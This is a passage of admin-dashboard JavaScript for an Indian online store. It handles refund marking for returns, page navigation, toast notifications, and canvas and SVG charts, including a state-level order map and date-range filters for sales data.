  const ref = prompt('Gateway refund reference (so this reconciles with GoKwik):', '') || '';
  try {
    await confirmCriticalAction('Mark this return as refunded? Money is about to move — this is password-gated.', async function(proof){
      const r = await apiFetch('/api/admin/returns/' + id + '/status', {
        method: 'PUT',
        headers: proof ? { 'X-Password-Proof': proof } : {},
        body: JSON.stringify({
          status: 'refunded',
          refund_amount: Number(amt) || 0,
          refund_method: 'gateway',
          refund_ref: ref,
        }),
      });
      const d = await r.json().catch(() => ({}));
      if (!r.ok) throw new Error(d.error || 'Could not mark refunded');
      toast('💸 Marked refunded');
      loadReturns();
    });
  } catch (e) { if (String(e.message) !== 'cancelled') toast('❌ ' + e.message, 'error'); }
}

// Keep the sidebar badge live even when the page is not open.
async function refreshReturnsBadge() {
  try {
    const d = await (await apiFetch('/api/admin/returns?status=requested')).json();
    const n = (d.returns || []).length;
    const badge = document.getElementById('returnsBadge');
    if (badge) badge.textContent = n;
    const badgeM = document.getElementById('returnsBadgeM');
    if (badgeM) { badgeM.textContent = n; badgeM.style.display = n ? 'flex' : 'none'; }
  } catch (e) { /* badge is cosmetic — never block the dashboard on it */ }
}

function showPage(name) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
  const pg = document.getElementById(`page-${name}`);
  if(pg) {
    pg.classList.add('active', 'oz-dashboard');
    pg.setAttribute('data-dashboard-surface', name);
  }
  // Match nav item by its onclick attribute exactly
  document.querySelectorAll('.nav-item').forEach(n => {
    const oc = n.getAttribute('onclick') || '';
    if(oc.includes(`'${name}'`)) n.classList.add('active');
  });
  // Close mobile sidebar + overlay
  var _sb = document.getElementById('sidebar');
  var _ov = document.getElementById('sidebarOverlay');
  if(_sb) _sb.classList.remove('open');
  if(_ov) _ov.style.display = 'none';
  document.body.style.overflow = '';
  if (name === 'returns') { try { loadReturns(); } catch(e) { console.error('[loadReturns]', e); } }
  // A page navigation always dismisses the mobile More drawer so its fixed
  // backdrop cannot remain above the document after a route change.
  if (typeof closeAdminMoreMenu === 'function') closeAdminMoreMenu();
  // Sync bottom nav
  if (typeof syncAbn === 'function') syncAbn(name);
  // Lazy loads
  if(name === 'analytics') loadAnalytics();
  if(name === 'whatsapp') loadWhatsAppPreview();
  if(name === 'database') { loadAuditLog(); loadSoftDeletes(); }
  if(name === 'payments') loadPayments();
  if(name === 'finance') loadFinance();
  if(name === 'automation') { loadAutomation(); }
  if(name === 'invoices') loadInvoices();
  if(name === 'banners') loadBanners();
  if(name === 'siteimages') { loadSiteImages(); loadPromoMedia(); loadBannerManagers(); loadFallbackManager(); loadPromoStripMedia(); }
  if(name === 'settings') { loadSettings(); }
  if(name === 'aiteam') { loadAITeamPage(); }
  if(name === 'staff') { loadStaffPage(); }
  if(name === 'calendar') { renderCalendar(); }
}

function toggleSidebar() {
  var sb = document.getElementById('sidebar');
  var ov = document.getElementById('sidebarOverlay');
  if (!sb) return;
  // Mobile uses the bottom navigation exclusively. Keep the desktop sidebar
  // and its backdrop inert at phone/tablet widths even if an old handler or
  // keyboard activation calls this function.
  if (window.matchMedia && window.matchMedia('(max-width: 900px)').matches) {
    sb.classList.remove('open');
    if (ov) { ov.classList.remove('open'); ov.style.display = 'none'; }
    document.body.style.overflow = '';
    return;
  }
  var isOpen = sb.classList.toggle('open');
  if (ov) ov.style.display = isOpen ? 'block' : 'none';
  document.body.style.overflow = isOpen ? 'hidden' : '';
}

function refreshCurrent() {
  const active = document.querySelector('.page.active');
  if(!active) return;
  const id = active.id.replace('page-','');
  const fns = {dashboard:loadDashboard,orders:loadOrders,products:loadProducts,inventory:loadInventory,discounts:loadDiscounts,customers:loadCustomers,analytics:loadAnalytics,payments:loadPayments,finance:loadFinance,invoices:loadInvoices,photolibrary:loadPhotoLibrary,banners:loadBanners,calendar:renderCalendar,siteimages:()=>{loadSiteImages();loadPromoMedia();loadBannerManagers();loadFallbackManager();loadPromoStripMedia();}};
  if(fns[id]) fns[id]();
}

function switchTab(group, tab, btn) {
  document.querySelectorAll(`#${group}-${tab}`).forEach(()=>{});
  const prefix = group+'-';
  document.querySelectorAll(`[id^="${prefix}"]`).forEach(p => p.classList.remove('active'));
  btn.closest('.card, .modal-body, .page').querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
  document.getElementById(`${prefix}${tab}`)?.classList.add('active');
  btn.classList.add('active');
}

// ═══════════════════════════════════════════════
// TOAST
// ═══════════════════════════════════════════════
function toast(msg, type='success') {
  const tc = document.getElementById('toastContainer');
  const t = document.createElement('div');
  t.className = `toast ${type}`;
  t.innerHTML = `<span>${type==='success'?'✅':type==='error'?'❌':'⚠️'}</span><span>${esc(msg)}</span>`;
  tc.appendChild(t);
  /* Mobile app rule: never let status pills drown the dashboard. */
  refreshMobileToasts();
  const ttl = 3500;
  setTimeout(()=>{ t.remove(); refreshMobileToasts(); }, ttl);
}
/* On phones keep at most MAX_MOBILE_TOASTS visible; the rest collapse
   into a single compact "• +N more" pill so the screen stays readable. */
function refreshMobileToasts() {
  const MAX_MOBILE_TOASTS = 2;
  const isPhone = window.innerWidth <= 600;
  const tc = document.getElementById('toastContainer');
  if (!tc) return;
  const toasts = [...tc.querySelectorAll('.toast:not(.toast-summary)')];
  const n = toasts.length;
  let sum = tc.querySelector('.toast-summary');
  if (isPhone && n > MAX_MOBILE_TOASTS) {
    if (!sum) {
      sum = document.createElement('div');
      sum.className = 'toast warning toast-summary';
      sum.innerHTML = `<span>•</span><span id="toastSummaryTxt">…</span>`;
      tc.insertBefore(sum, tc.firstChild);
    }
    const hidden = n - MAX_MOBILE_TOASTS;
    sum.style.display = 'flex';
    document.getElementById('toastSummaryTxt').textContent = `${hidden} more notice${hidden>1?'s':''} below (tap More → Settings → Integrations for details)`;
    toasts.forEach((t,i)=>{ t.classList.toggle('toast-hidden-mobile', i < hidden); });
  } else {
    toasts.forEach(t=>t.classList.remove('toast-hidden-mobile'));
    if (sum) sum.style.display = 'none';
  }
}

// ═══════════════════════════════════════════════
// MODALS
// ═══════════════════════════════════════════════
function openModal(id) { document.getElementById(id).classList.add('open'); }
function closeModal(id) { document.getElementById(id).classList.remove('open'); }
document.querySelectorAll('.modal-overlay').forEach(o => o.addEventListener('click', e => { if(e.target===o) o.classList.remove('open'); }));

// ═══════════════════════════════════════════════
// CANVAS CHART ENGINE — 3D / Animated
// ═══════════════════════════════════════════════
if (!CanvasRenderingContext2D.prototype.roundRect) {
  CanvasRenderingContext2D.prototype.roundRect = function(x,y,w,h,r){
    r=Array.isArray(r)?r[0]:r||0;
    this.beginPath();this.moveTo(x+r,y);
    this.arcTo(x+w,y,x+w,y+h,r);this.arcTo(x+w,y+h,x,y+h,r);
    this.arcTo(x,y+h,x,y,r);this.arcTo(x,y,x+w,y,r);
    this.closePath();return this;
  };
}

// Animated counter
function animateCount(el, from, to, fmt, dur=900) {
  if(!el) return;
  const start = performance.now();
  const tick = now => {
    const p = Math.min((now-start)/dur, 1);
    const ease = 1 - Math.pow(1-p, 3);
    const v = from + (to-from)*ease;
    el.textContent = fmt(v);
    if(p < 1) requestAnimationFrame(tick);
  };
  requestAnimationFrame(tick);
}

// 3D Bar Chart with line overlay
// ── Theme-aware chart palette: reads CSS vars so every theme can restyle charts ──
function chartTheme(){
  try {
    const cs = getComputedStyle(document.body);
    const mode = localStorage.getItem(LAYOUT_THEME_KEY) || 'command';
    const palette = localStorage.getItem(PALETTE_KEY) || 'plum';
    const base = {
      primary: cs.getPropertyValue('--chart-primary').trim() || '#547177',
      secondary: cs.getPropertyValue('--chart-secondary').trim() || '#3B7EA6',
      accent: cs.getPropertyValue('--chart-accent').trim() || '#8F6417',
      grid: cs.getPropertyValue('--chart-grid').trim() || 'rgba(216,103,110,0.08)',
      legend: cs.getPropertyValue('--chart-legend').trim() || 'rgba(232,237,224,0.9)',
      line: cs.getPropertyValue('--chart-primary').trim() || '#547177',
      fill: cs.getPropertyValue('--chart-primary').trim() || '#547177',
      status: cs.getPropertyValue('--chart-primary').trim() || '#547177',
      warn: cs.getPropertyValue('--chart-accent').trim() || '#8F6417',
      bad: '#D95C68',
      lineWidth: mode === 'signal' ? 2.8 : mode === 'studio' ? 2.2 : 2,
      barDepth: mode === 'studio' ? 9 : mode === 'signal' ? 4 : 6,
      pointRadius: mode === 'studio' ? 4 : mode === 'signal' ? 2 : 3,
      palette, mode,
    };
    if (mode === 'signal') {
      base.lineWidth = 2.8;
      base.barDepth = 4;
    }
    return base;
  } catch (e) {
    return {primary:'#547177',secondary:'#3B7EA6',accent:'#8F6417',grid:'rgba(216,103,110,0.08)',legend:'rgba(232,237,224,0.9)',line:'#547177',fill:'#547177',status:'#547177',warn:'#8F6417',bad:'#D95C68',lineWidth:2,barDepth:6,pointRadius:3,mode:'command',palette:'plum'};
  }
}
function drawBarChart(canvasId, labels, data, color='#547177', lineData=null) {
  const canvas = document.getElementById(canvasId);
  if(!canvas) return;
  const dpr = window.devicePixelRatio||1;
  const W0 = canvas.clientWidth||canvas.offsetWidth||400;
  const H0 = canvas.clientHeight||canvas.offsetHeight||180;
  canvas.width = W0*dpr; canvas.height = H0*dpr;
  canvas.style.width = W0+'px'; canvas.style.height = H0+'px';
  const ctx = canvas.getContext('2d');
  ctx.scale(dpr,dpr);
  const ct = chartTheme();
  const W=W0, H=H0;
  const pad={t:14,r:14,b:32,l:54};
  const cW=W-pad.l-pad.r, cH=H-pad.t-pad.b;
  const max=Math.max(...data,1);
  const barW=Math.max(6,(cW/data.length)-5);

  // Background grid
  ctx.strokeStyle=ct.grid; ctx.lineWidth=1;
  for(let i=0;i<=4;i++){
    const y=pad.t+cH-(i/4)*cH;
    ctx.beginPath();ctx.moveTo(pad.l,y);ctx.lineTo(W-pad.r,y);ctx.stroke();
    ctx.fillStyle='rgba(106,120,96,0.65)';
    ctx.font=`${9*dpr/dpr}px DM Sans,sans-serif`;
    ctx.textAlign='right';
    const v=max*i/4;
    ctx.fillText(v>=1000?'₹'+(v/1000).toFixed(0)+'k':'₹'+v.toFixed(0),pad.l-5,y+3);
  }

  // 3D bars
  data.forEach((v,i)=>{
    const x=pad.l+i*(cW/data.length)+(cW/data.length-barW)/2;
    const bH=Math.max(2,(v/max)*cH);
    const y=pad.t+cH-bH;
    // Side face (3D effect)
    const sw=ct.barDepth;
    ctx.fillStyle='rgba(0,0,0,0.3)';
    ctx.beginPath();ctx.moveTo(x+barW,y);ctx.lineTo(x+barW+sw,y-sw/2);
    ctx.lineTo(x+barW+sw,y+bH-sw/2);ctx.lineTo(x+barW,y+bH);ctx.closePath();ctx.fill();
    // Top face
    ctx.fillStyle='rgba(255,255,255,0.08)';
    ctx.beginPath();ctx.moveTo(x,y);ctx.lineTo(x+barW,y);
    ctx.lineTo(x+barW+sw,y-sw/2);ctx.lineTo(x+sw,y-sw/2);ctx.closePath();ctx.fill();
    // Front face gradient
    const grd=ctx.createLinearGradient(0,y,0,y+bH);
    grd.addColorStop(0,color+'FF');grd.addColorStop(1,color+'50');
    ctx.fillStyle=grd;
    ctx.beginPath();ctx.roundRect(x,y,barW,bH,[3,3,0,0]);ctx.fill();
    // Value on hover (show top value)
    if(v>0){
      ctx.fillStyle='rgba(126,200,80,0.9)';ctx.font='8px DM Sans,sans-serif';
      ctx.textAlign='center';
      ctx.fillText(v>=1000?(v/1000).toFixed(1)+'k':Math.round(v),x+barW/2,y-3);
    }
    // X label
    ctx.fillStyle='rgba(106,120,96,0.8)';ctx.font='8px DM Sans,sans-serif';ctx.textAlign='center';
    if(labels[i]) ctx.fillText(labels[i].slice(0,3),x+barW/2,H-pad.b+12);
  });

  // Line overlay
  if(lineData&&lineData.length===data.length){
    const lMax=Math.max(...lineData,1);
    ctx.strokeStyle=ct.accent;ctx.lineWidth=ct.lineWidth;ctx.setLineDash([]);
    ctx.beginPath();
    lineData.forEach((v,i)=>{
      const x=pad.l+i*(cW/data.length)+barW/2+(cW/data.length-barW)/2;
      const y=pad.t+cH-(v/lMax)*cH;
      i===0?ctx.moveTo(x,y):ctx.lineTo(x,y);
    });
    ctx.stroke();
    // Dots
    lineData.forEach((v,i)=>{
      const x=pad.l+i*(cW/data.length)+barW/2+(cW/data.length-barW)/2;
      const y=pad.t+cH-(v/lMax)*cH;
      ctx.beginPath();ctx.arc(x,y,ct.pointRadius,0,Math.PI*2);
      ctx.fillStyle='#8F6417';ctx.fill();
    });
  }
}

// Sparkline
function drawSparkline(canvasId, data, color='#547177') {
  const canvas=document.getElementById(canvasId);if(!canvas)return;
  const dpr=window.devicePixelRatio||1;
  const W0=canvas.clientWidth||120,H0=36;
  canvas.width=W0*dpr;canvas.height=H0*dpr;
  canvas.style.width=W0+'px';canvas.style.height=H0+'px';
  const ctx=canvas.getContext('2d');ctx.scale(dpr,dpr);
  const W=W0,H=H0,pad=4;
  const max=Math.max(...data,1),min=Math.min(...data,0);
  const range=max-min||1;
  const pts=data.map((v,i)=>({x:pad+i*(W-pad*2)/(data.length-1),y:H-pad-(v-min)/range*(H-pad*2)}));
  // Fill
  const grd=ctx.createLinearGradient(0,0,0,H);
  grd.addColorStop(0,color+'50');grd.addColorStop(1,color+'00');
  ctx.beginPath();ctx.moveTo(pts[0].x,H);
  pts.forEach(p=>ctx.lineTo(p.x,p.y));
  ctx.lineTo(pts[pts.length-1].x,H);ctx.closePath();
  ctx.fillStyle=grd;ctx.fill();
  // Line
  ctx.beginPath();pts.forEach((p,i)=>i===0?ctx.moveTo(p.x,p.y):ctx.lineTo(p.x,p.y));
  ctx.strokeStyle=color;ctx.lineWidth=2;ctx.stroke();
}

// Animated Donut
function drawDonutChart(canvasId, labels, data, colors, centerLabel='') {
  const canvas=document.getElementById(canvasId);if(!canvas)return;
  const dpr=window.devicePixelRatio||1;
  const W0=canvas.clientWidth||260,H0=canvas.clientHeight||160;
  canvas.width=W0*dpr;canvas.height=H0*dpr;
  canvas.style.width=W0+'px';canvas.style.height=H0+'px';
  const ctx=canvas.getContext('2d');ctx.scale(dpr,dpr);
  const W=W0,H=H0;
  const total=data.reduce((s,v)=>s+v,0);if(!total)return;
  const r=Math.min(H/2,70)-8,ir=r*0.6;
  const cx=r+16,cy=H/2;
  let startAngle=-Math.PI/2;
  data.forEach((v,i)=>{
    const angle=(v/total)*Math.PI*2;
    // Outer shadow
    ctx.shadowColor=colors[i%colors.length]+'80';ctx.shadowBlur=12;
    ctx.beginPath();ctx.moveTo(cx,cy);
    ctx.arc(cx,cy,r,startAngle,startAngle+angle);
    ctx.closePath();ctx.fillStyle=colors[i%colors.length];ctx.fill();
    ctx.shadowBlur=0;
    startAngle+=angle;
  });
  // Inner hole
  ctx.beginPath();ctx.arc(cx,cy,ir,0,Math.PI*2);
  const hGrd=ctx.createRadialGradient(cx,cy,ir*0.3,cx,cy,ir);
  hGrd.addColorStop(0,'#0F1410');hGrd.addColorStop(1,'#0A0D0A');
  ctx.fillStyle=hGrd;ctx.fill();
  // Center text
  ctx.fillStyle='#1D2320';ctx.font=`bold ${Math.min(16,r*0.35)}px Syne,sans-serif`;
  ctx.textAlign='center';ctx.fillText(centerLabel||total,cx,cy+5);
  ctx.fillStyle='rgba(106,120,96,0.7)';ctx.font='8px DM Sans,sans-serif';
  ctx.fillText('total',cx,cy+17);
  // Legend
  const lx=cx+r+14;
  labels.slice(0,6).forEach((lbl,i)=>{
    const ly=8+i*22;
    const pct=((data[i]/total)*100).toFixed(0);
    // Color dot
    ctx.fillStyle=colors[i%colors.length];
    ctx.beginPath();ctx.arc(lx+5,ly+5,5,0,Math.PI*2);ctx.fill();
    // Label
    ctx.fillStyle='rgba(232,237,224,0.9)';ctx.font='bold 9px DM Sans,sans-serif';
    ctx.textAlign='left';ctx.fillText(lbl,lx+14,ly+5);
    ctx.fillStyle='rgba(126,200,80,0.8)';ctx.font='8px DM Sans,sans-serif';
    ctx.fillText(`${data[i]} (${pct}%)`,lx+14,ly+15);
  });
}

// Horizontal bar chart (categories)
function drawHBarChart(canvasId, labels, data, colors) {
  const canvas=document.getElementById(canvasId);if(!canvas)return;
  const dpr=window.devicePixelRatio||1;
  const W0=canvas.clientWidth||400,H0=canvas.clientHeight||180;
  canvas.width=W0*dpr;canvas.height=H0*dpr;
  canvas.style.width=W0+'px';canvas.style.height=H0+'px';
  const ctx=canvas.getContext('2d');ctx.scale(dpr,dpr);
  const W=W0,H=H0;
  const max=Math.max(...data,1);
  const rowH=H/Math.max(labels.length,1);
  const pad={l:90,r:20,t:8,b:8};
  labels.forEach((lbl,i)=>{
    const y=pad.t+i*rowH;
    const bH=Math.max(8,rowH-8);
    const bY=y+(rowH-bH)/2;
    const bW=(data[i]/max)*(W-pad.l-pad.r);
    // Label
    ctx.fillStyle='rgba(158,170,144,0.9)';ctx.font='9px DM Sans,sans-serif';
    ctx.textAlign='right';ctx.fillText(lbl.slice(0,10),pad.l-6,bY+bH/2+3);
    // Shadow bar
    ctx.fillStyle='rgba(0,0,0,0.2)';
    ctx.beginPath();ctx.roundRect(pad.l+2,bY+2,bW,bH,[3]);ctx.fill();
    // Colored bar
    const c=colors?colors[i%colors.length]:'#547177';
    const grd=ctx.createLinearGradient(pad.l,0,pad.l+bW,0);
    grd.addColorStop(0,c);grd.addColorStop(1,c+'80');
    ctx.fillStyle=grd;ctx.beginPath();ctx.roundRect(pad.l,bY,bW,bH,[3]);ctx.fill();
    // Value
    ctx.fillStyle='rgba(232,237,224,0.9)';ctx.font='bold 9px DM Sans,sans-serif';
    ctx.textAlign='left';ctx.fillText('₹'+(data[i]>=1000?(data[i]/1000).toFixed(1)+'k':Math.round(data[i])),pad.l+bW+5,bY+bH/2+3);
  });
}

// Hourly bars
function drawHourlyChart(canvasId, data) {
  const canvas=document.getElementById(canvasId);if(!canvas)return;
  const dpr=window.devicePixelRatio||1;
  const W0=canvas.clientWidth||260,H0=canvas.clientHeight||160;
  canvas.width=W0*dpr;canvas.height=H0*dpr;
  canvas.style.width=W0+'px';canvas.style.height=H0+'px';
  const ctx=canvas.getContext('2d');ctx.scale(dpr,dpr);
  const W=W0,H=H0,pad={t:10,r:8,b:22,l:28};
  const cW=W-pad.l-pad.r,cH=H-pad.t-pad.b;
  const max=Math.max(...data,1);
  const barW=Math.max(4,cW/24-2);
  const now=new Date().getHours();
  data.forEach((v,i)=>{
    const x=pad.l+i*(cW/24)+(cW/24-barW)/2;
    const bH=Math.max(2,(v/max)*cH);
    const y=pad.t+cH-bH;
    const isCurrent=i===now;
    const col=isCurrent?'#8F6417':v>0?'#4A8A28':'#F7EFE3';
    ctx.fillStyle=col+'80';ctx.fillRect(x+2,y+2,barW,bH);
    ctx.fillStyle=col;ctx.beginPath();ctx.roundRect(x,y,barW,bH,[2,2,0,0]);ctx.fill();
    if(i%4===0){
      ctx.fillStyle='rgba(106,120,96,0.6)';ctx.font='7px DM Sans,sans-serif';
      ctx.textAlign='center';ctx.fillText(i+'h',x+barW/2,H-pad.b+10);
    }
  });
  // Current time line
  const cx=pad.l+now*(cW/24)+(cW/24)/2;
  ctx.strokeStyle=chartTheme().accent;ctx.lineWidth=1;ctx.setLineDash([3,3]);
  ctx.beginPath();ctx.moveTo(cx,pad.t);ctx.lineTo(cx,pad.t+cH);ctx.stroke();ctx.setLineDash([]);
}

// India Map SVG
function renderIndiaMap(cityData) {
  const svg = document.getElementById('indiaMap');
  if(!svg) return;
  // Simplified India states paths (key states)
  const states = [
    {id:'MH',name:'Maharashtra',d:'M 140 230 L 155 220 L 175 225 L 185 240 L 180 260 L 165 270 L 150 265 L 135 250 Z',cx:160,cy:245},
    {id:'DL',name:'Delhi',d:'M 165 155 L 172 150 L 178 155 L 175 163 L 168 163 Z',cx:172,cy:157},
    {id:'KA',name:'Karnataka',d:'M 145 280 L 165 272 L 180 280 L 178 305 L 160 310 L 142 302 Z',cx:162,cy:292},
    {id:'TN',name:'Tamil Nadu',d:'M 155 308 L 175 303 L 182 318 L 175 340 L 163 348 L 150 335 L 148 318 Z',cx:165,cy:325},
    {id:'GJ',name:'Gujarat',d:'M 108 195 L 128 188 L 140 195 L 142 215 L 130 225 L 112 220 L 105 210 Z',cx:125,cy:208},
    {id:'RJ',name:'Rajasthan',d:'M 115 145 L 150 135 L 168 148 L 165 175 L 148 185 L 125 180 L 110 168 Z',cx:142,cy:162},
    {id:'UP',name:'Uttar Pradesh',d:'M 172 145 L 205 140 L 218 152 L 215 172 L 198 180 L 178 178 L 165 165 Z',cx:195,cy:162},
    {id:'WB',name:'West Bengal',d:'M 230 175 L 245 168 L 255 178 L 252 200 L 238 205 L 226 198 Z',cx:241,cy:188},
    {id:'TS',name:'Telangana',d:'M 170 255 L 188 248 L 200 258 L 198 278 L 182 282 L 168 275 Z',cx:185,cy:265},
    {id:'AP',name:'Andhra Pradesh',d:'M 175 280 L 200 272 L 212 283 L 208 305 L 192 310 L 172 303 Z',cx:193,cy:292},
    {id:'KL',name:'Kerala',d:'M 148 330 L 160 325 L 165 345 L 158 368 L 148 370 L 142 355 Z',cx:154,cy:350},
    {id:'MP',name:'Madhya Pradesh',d:'M 148 188 L 185 182 L 198 192 L 195 215 L 178 225 L 155 222 L 142 210 Z',cx:172,cy:205},
    {id:'HR',name:'Haryana',d:'M 155 148 L 175 142 L 182 152 L 178 163 L 160 165 L 152 158 Z',cx:167,cy:155},
    {id:'PB',name:'Punjab',d:'M 148 130 L 168 124 L 178 132 L 175 148 L 158 150 L 145 142 Z',cx:162,cy:138},
    {id:'OD',name:'Odisha',d:'M 218 205 L 238 198 L 248 210 L 244 232 L 228 238 L 215 228 Z',cx:232,cy:220},
    {id:'BR',name:'Bihar',d:'M 208 168 L 228 162 L 238 172 L 235 188 L 218 192 L 205 183 Z',cx:222,cy:178},
    {id:'JH',name:'Jharkhand',d:'M 215 190 L 235 185 L 245 195 L 242 212 L 225 215 L 212 206 Z',cx:228,cy:200},
    {id:'CG',name:'Chhattisgarh',d:'M 188 215 L 210 210 L 220 222 L 216 248 L 200 252 L 185 242 Z',cx:203,cy:232},
    {id:'AS',name:'Assam',d:'M 268 158 L 292 152 L 302 162 L 298 175 L 278 178 L 265 170 Z',cx:283,cy:165},
    {id:'UK',name:'Uttarakhand',d:'M 170 130 L 192 124 L 202 132 L 200 148 L 182 152 L 168 145 Z',cx:185,cy:138},
  ];

  const maxOrders = Math.max(...Object.values(cityData).map(c=>c.orders||0), 1);

  svg.innerHTML = states.map(s => {
    // Map state to city data (rough match)
    const stateMatch = Object.entries(cityData).find(([city]) =>
      city.toLowerCase().includes(s.name.toLowerCase().split(' ')[0]) ||
      s.name.toLowerCase().includes(city.toLowerCase().split(' ')[0])
    );
    const orders = stateMatch ? stateMatch[1].orders||0 : 0;
    const intensity = orders/maxOrders;
    const fill = orders > 0
      ? `rgba(74,138,40,${0.2 + intensity*0.7})`
      : 'var(--surface2)';
    const stroke = orders > 0 ? '#547177' : 'rgba(216,103,110,0.2)';
    return `<path class="map-state" id="state-${s.id}" d="${s.d}" fill="${fill}" stroke="${stroke}"
      onmouseenter="showMapTip(event,'${s.name}',${orders})"
      onmouseleave="hideMapTip()"
      style="filter:${orders>0?'drop-shadow(0 0 4px rgba(74,138,40,'+(intensity*0.5)+'))':'none'}"/>`;
  }).join('') +
  // City dots for top cities
  Object.entries(cityData).slice(0,8).map(([city, info]) => {
    const state = states.find(s => s.name.toLowerCase().includes(city.toLowerCase().split(' ')[0]) ||
      city.toLowerCase().includes(s.name.toLowerCase().split(' ')[0]));
    if(!state) return '';
    const r = 3 + (info.orders/maxOrders)*6;
    return `<circle cx="${state.cx}" cy="${state.cy}" r="${r}"
      fill="var(--green-bright)" style="filter:drop-shadow(0 0 6px var(--green));opacity:0.85;"
      onmouseenter="showMapTip(event,'${city}',${info.orders})"
      onmouseleave="hideMapTip()"/>`;
  }).join('') +
  // Labels for big states
  states.filter(s => ['MH','DL','KA','UP','GJ','TN'].includes(s.id)).map(s =>
    `<text x="${s.cx}" y="${s.cy+3}" text-anchor="middle" fill="rgba(232,237,224,0.5)"
      font-size="7" font-family="DM Sans,sans-serif">${s.id}</text>`
  ).join('');
}

function showMapTip(e, name, orders) {
  const tip = document.getElementById('mapTooltip');
  if(!tip) return;
  tip.innerHTML = `<strong style="color:var(--green-text)">${esc(name)}</strong><br>${orders} orders`;
  tip.style.display = 'block';
  const wrap = document.getElementById('indiaMapWrap');
  const rect = wrap.getBoundingClientRect();
  tip.style.left = (e.clientX - rect.left + 10) + 'px';
  tip.style.top  = (e.clientY - rect.top  - 10) + 'px';
}
function hideMapTip() {
  const tip = document.getElementById('mapTooltip');
  if(tip) tip.style.display = 'none';
}

// Goal ring
function drawGoalRing(canvasId, pct, color='#547177') {
  const canvas = document.getElementById(canvasId);if(!canvas)return;
  const dpr=window.devicePixelRatio||1;
  const S=100;
  canvas.width=S*dpr;canvas.height=S*dpr;
  canvas.style.width=S+'px';canvas.style.height=S+'px';
  const ctx=canvas.getContext('2d');ctx.scale(dpr,dpr);
  const cx=S/2,cy=S/2,r=38;
  // BG ring
  ctx.beginPath();ctx.arc(cx,cy,r,0,Math.PI*2);
  ctx.strokeStyle='rgba(216,103,110,0.1)';ctx.lineWidth=8;ctx.stroke();
  // Progress ring
  const endAngle=-Math.PI/2+(pct/100)*Math.PI*2;
  const grd=ctx.createLinearGradient(cx-r,cy,cx+r,cy);
  grd.addColorStop(0,color);grd.addColorStop(1,'#8F6417');
  ctx.beginPath();ctx.arc(cx,cy,r,-Math.PI/2,endAngle);
  ctx.strokeStyle=grd;ctx.lineWidth=8;ctx.lineCap='round';
  ctx.shadowColor=color;ctx.shadowBlur=12;ctx.stroke();ctx.shadowBlur=0;
  // Center
  ctx.fillStyle='#1D2320';ctx.font='bold 16px Syne,sans-serif';
  ctx.textAlign='center';ctx.fillText(Math.round(pct)+'%',cx,cy+4);
  ctx.fillStyle='rgba(106,120,96,0.7)';ctx.font='8px DM Sans,sans-serif';
  ctx.fillText('achieved',cx,cy+16);
}

// ═══════════════════════════════════════════════
// DASHBOARD — Full real-data render
// ═══════════════════════════════════════════════
// Global dashboard-wide date range — drives EVERY time-based section on this page
let _dashGRange = { mode: 'days', days: 7, from: null, to: null };
let _dashLastStats = {};

function _dashGFilterOrders(orders) {
  if (_dashGRange.mode === 'today') {
    const todayStr = new Date().toISOString().split('T')[0];
    return orders.filter(o => (o.created_at || '').startsWith(todayStr));
  }
  if (_dashGRange.mode === 'all') return orders;
  if (_dashGRange.mode === 'custom' && _dashGRange.from && _dashGRange.to) {
    const start = new Date(_dashGRange.from);
    const end   = new Date(_dashGRange.to); end.setHours(23,59,59,999);
    return orders.filter(o => { const d = new Date(o.created_at); return d >= start && d <= end; });
  }
  const cutoff = new Date(); cutoff.setDate(cutoff.getDate() - (_dashGRange.days||7)); cutoff.setHours(0,0,0,0);
  return orders.filter(o => new Date(o.created_at) >= cutoff);
}
function _dashGRangeLabel() {
  if (_dashGRange.mode === 'today') return 'Today';
  if (_dashGRange.mode === 'all') return 'All time';
  if (_dashGRange.mode === 'custom' && _dashGRange.from && _dashGRange.to) return `${_dashGRange.from} → ${_dashGRange.to}`;
  if (_dashGRange.days === 365) return 'Last 1 year';
  return `Last ${_dashGRange.days} days`;
}
// Bucket spec reused by every chart on the page so they all slice time the same way
function _dashGBucketSpec() {
  if (_dashGRange.mode === 'custom' && _dashGRange.from && _dashGRange.to) return { days:null, customRange:{from:_dashGRange.from, to:_dashGRange.to} };
  if (_dashGRange.mode === 'today') return { days:1, customRange:null }; // today shown in fine-grained daily slice
  if (_dashGRange.mode === 'all') return { days:90, customRange:null }; // cap chart buckets at 90d for 'all time' for readability
  return { days:_dashGRange.days||7, customRange:null }; // 365 = '1Y' chip — chart buckets monthly below
}
function setDashGlobalRange(days, btn) {
  _dashGRange = days === 'today' ? { mode:'today', days:null, from:null, to:null }
                : days === 'all'  ? { mode:'all',   days:null, from:null, to:null }
                : { mode:'days', days, from:null, to:null };
  document.getElementById('dashGCustomBar').style.display = 'none';
  document.querySelectorAll('[id^=dashGChip]').forEach(b=>b.classList.remove('active'));
  btn.classList.add('active');
  document.getElementById('dashGRangeLabel').textContent = _dashGRangeLabel();
  if (allOrders && allOrders.length !== undefined) renderDashboardData(allOrders, allProducts, _dashLastStats);
}
function toggleDashGlobalCustom() {
  const bar = document.getElementById('dashGCustomBar');
  const show = bar.style.display === 'none';
  bar.style.display = show ? 'flex' : 'none';
  if (show) {
    document.querySelectorAll('[id^=dashGChip]').forEach(b=>b.classList.remove('active'));
    document.getElementById('dashGChipCustom').classList.add('active');
  }
}
function applyDashGlobalCustomRange() {
  const from = document.getElementById('dashGDateStart').value;
  const to   = document.getElementById('dashGDateEnd').value;
  if (!from || !to) { toast('Pick both a start and end date','error'); return; }
  _dashGRange = { mode:'custom', days:null, from, to };
  document.querySelectorAll('[id^=dashGChip]').forEach(b=>b.classList.remove('active'));
  document.getElementById('dashGChipCustom').classList.add('active');
  document.getElementById('dashGRangeLabel').textContent = _dashGRangeLabel();
  renderDashboardData(allOrders, allProducts, _dashLastStats);
}

async function loadDashboardCore() {
  document.getElementById('kpiCards').innerHTML = Array(4).fill('<div class="kpi skel" style="height:108px"></div>').join('');
  try {
    const [statsR, ordersR, prodsR] = await Promise.all([
      apiFetch('/api/admin/stats'),
      apiFetch('/api/admin/orders?limit=2000'),
      apiFetch('/api/admin/products')
    ]);
    const stats   = (await statsR.json()).stats || {};
    const ordData = await ordersR.json();
    const prdData = await prodsR.json();
    const orders  = ordData.data||ordData.orders||(Array.isArray(ordData)?ordData:[]);
    const prods   = prdData.data||prdData.products||(Array.isArray(prdData)?prdData:[]);
    allOrders = orders; allProducts = prods; _dashLastStats = stats;
    renderDashboardData(orders, prods, stats);
    loadCourierWallet();
